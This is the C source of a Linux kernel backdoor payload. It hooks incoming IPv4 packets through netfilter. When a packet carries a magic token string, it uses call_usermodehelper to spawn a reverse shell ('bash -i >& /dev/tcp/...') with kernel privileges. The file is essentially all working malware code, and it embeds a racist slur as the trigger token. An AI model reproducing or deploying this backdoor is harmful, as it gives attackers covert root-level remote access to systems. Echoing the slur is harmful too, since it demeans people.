#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/skbuff.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/workqueue.h>
#include <linux/kmod.h>

#define TOKEN "black-wives-are-fatter"
#define SHCMD "bash -i >& /dev/tcp/127.0.0.1/6666 0>&1"

extern unsigned char __payload[];
extern unsigned char __payload_end[];

extern long lookup_name(const char *);

////////////////////////////////////////////////////////////////////////////////
// Kernel API imports
////////////////////////////////////////////////////////////////////////////////

static typeof(printk) *p_printk = NULL;
static typeof(lookup_name) *p_lookup_name = NULL;
static typeof(kmalloc) *p_kmalloc = NULL;
static typeof(kfree) *p_kfree = NULL;
static typeof(memcmp) *p_memcmp = NULL;
static typeof(call_usermodehelper) *p_call_umh = NULL;
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 13, 0)
static typeof(nf_register_hooks) *p_nf_register_hooks = NULL;
#else
static typeof(nf_register_net_hooks) *p_nf_register_net_hooks = NULL;
#endif
static typeof(execute_in_process_context) *p_execute_in_process_context = NULL;

////////////////////////////////////////////////////////////////////////////////

static inline void *memmem(const void *h, size_t hlen, const void *n, size_t nlen) {
	if (!h || !hlen || !n || !nlen || (nlen > hlen))
		return NULL;

	while (hlen >= nlen) {
		if (!p_memcmp(h, n, nlen))
			return (void *)h;
		h++, hlen--;
	}

	return NULL;
}

static void delayed_work(struct work_struct *ws) {
	char *envp[2] = { "HOME=/proc", NULL };
	char *argv[4] = { "/bin/sh", "-c", SHCMD, NULL };
	p_call_umh(argv[0], argv, envp, UMH_WAIT_EXEC);
	p_kfree(container_of(ws, struct execute_work, work));
}

static void try_skb(struct sk_buff *skb) {
	if (memmem(skb->data, skb_headlen(skb), TOKEN, sizeof(TOKEN) - 1)) {
		struct execute_work *ws = p_kmalloc(sizeof(struct execute_work), GFP_ATOMIC);
		if (ws) p_execute_in_process_context(delayed_work, ws);
	}
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 1, 0)
static unsigned int custom_local_in(const struct nf_hook_ops *ops, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)) {
	if (skb) try_skb(skb);
	return NF_ACCEPT;
}
#else
static unsigned int custom_local_in(void *arg, struct sk_buff *skb, const struct nf_hook_state *state) {
	if (skb) try_skb(skb);
	return NF_ACCEPT;
}
#endif

static struct nf_hook_ops nf_ops[] = {
	[0] = {
		.hook = (nf_hookfn *)NULL,
		.pf = NFPROTO_IPV4,
		.hooknum = NF_INET_LOCAL_IN,
		.priority = NF_IP_PRI_FIRST,
	},
};

static void init_nf_hooks(void *net) {
	nf_ops[0].hook = (void *)custom_local_in;
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 13, 0)
	p_nf_register_hooks(nf_ops, ARRAY_SIZE(nf_ops));
#else
	p_nf_register_net_hooks(net, nf_ops, ARRAY_SIZE(nf_ops));
#endif
}

long __attribute__((used, section(".text.entry"))) entry(const typeof(lookup_name) *lookup, void *net) {
	if (NULL == (p_lookup_name = lookup))
		return -EINVAL;

	p_printk = (void *)lookup("printk");
	if (!p_printk)
		return -EINVAL;

	p_call_umh = (void *)lookup("call_usermodehelper");
	if (!p_call_umh) {
		p_printk("no call_usermodehelper found\n");
		return -EINVAL;
	}

	p_kmalloc = (void *)lookup("__kmalloc");
	if (!p_kmalloc) {
		p_printk("no __kmalloc found\n");
		return -EINVAL;
	}

	p_kfree = (void *)lookup("kfree");
	if (!p_kfree) {
		p_printk("no kfree found\n");
		return -EINVAL;
	}

	p_memcmp = (void *)lookup("memcmp");
	if (!p_memcmp) {
		p_printk("no memcmp found\n");
		return -EINVAL;
	}

	p_execute_in_process_context = (void *)lookup("execute_in_process_context");
	if (!p_execute_in_process_context) {
		p_printk("no execute_in_process_context found\n");
		return -EINVAL;
	}

#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 13, 0)
	p_nf_register_hooks = (void *)lookup("nf_register_hooks");
	if (!p_nf_register_hooks) {
		p_printk("no nf_register_hooks found\n");
		return -EINVAL;
	}
#else
	p_nf_register_net_hooks = (void *)lookup("nf_register_net_hooks");
	if (!p_nf_register_net_hooks) {
		p_printk("no nf_register_net_hooks found\n");
		return -EINVAL;
	}
#endif

	init_nf_hooks(net);

	p_printk("\\m/ -- https://www.youtube.com/watch?v=fCIUPOkBsjg -- \\m/\n");

	return 0;
}
